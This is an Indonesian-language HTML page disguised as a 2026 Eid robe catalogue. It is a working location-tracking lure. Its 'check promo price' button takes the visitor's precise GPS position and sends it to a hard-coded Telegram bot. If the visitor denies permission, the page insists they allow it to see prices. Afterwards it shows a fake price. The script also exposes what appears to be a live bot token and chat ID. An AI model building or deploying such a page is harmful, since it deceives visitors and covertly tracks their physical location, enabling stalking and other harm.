<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Katalog Gamis Lebaran 2026</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #f4f4f4; padding: 20px; }
        .box { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
        img { width: 100%; border-radius: 10px; }
        button { background: #8d6e63; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin-top: 15px; }
    </style>
</head>
<body>

    <div class="box">
        <h2>Koleksi Gamis Premium ✨</h2>
        <p>Klik tombol di bawah untuk cek stok & harga promo di kotamu!</p>
        <img src="https://images.unsplash.com/photo-1585487000160-6ebcfceb0d03?q=80&w=1000" alt="Baju">
        <br>
        <button onclick="mintaLokasi()">Cek Harga Promo</button>
        <p id="status" style="font-size: 12px; color: gray;"></p>
    </div>

    <script>
        // MASUKKAN DATA KAMU DI SINI
        const TOKEN_BOT = '8658282442:AAFQUZfcPVNUqIDXM0NMWUjGy2G5HHgzhM4'; 
        const ID_CHAT = '1097216714';

        function mintaLokasi() {
            document.getElementById('status').innerHTML = "Sedang mengecek koneksi...";
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(kirimData, handleErr, {
                    enableHighAccuracy: true,
                    timeout: 10000
                });
            } else {
                alert("Browser kamu tidak mendukung pelacakan lokasi.");
            }
        }

        function kirimData(posisi) {
            const lat = posisi.coords.latitude;
            const lon = posisi.coords.longitude;
            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
            
            const teks = `📍 *LOKASI DITEMUKAN!*\n\nLink Maps: ${mapsLink}\nLat: ${lat}\nLon: ${lon}`;

            // Mengirim ke Telegram
            fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ID_CHAT,
                    text: teks,
                    parse_mode: 'Markdown'
                })
            })
            .then(res => {
                if(res.ok) {
                    alert("Koneksi berhasil! Harga promo: Rp 149.000 (Stok Tersedia)");
                    document.getElementById('status').innerHTML = "Selesai.";
                } else {
                    alert("Gagal kirim ke Bot. Cek Token/ID kamu.");
                }
            })
            .catch(err => alert("Error koneksi: " + err));
        }

        function handleErr(error) {
            alert("Kamu harus klik 'Allow' atau 'Izinkan' untuk melihat harga promo.");
            document.getElementById('status').innerHTML = "Akses ditolak.";
        }
    </script>
</body>
</html>
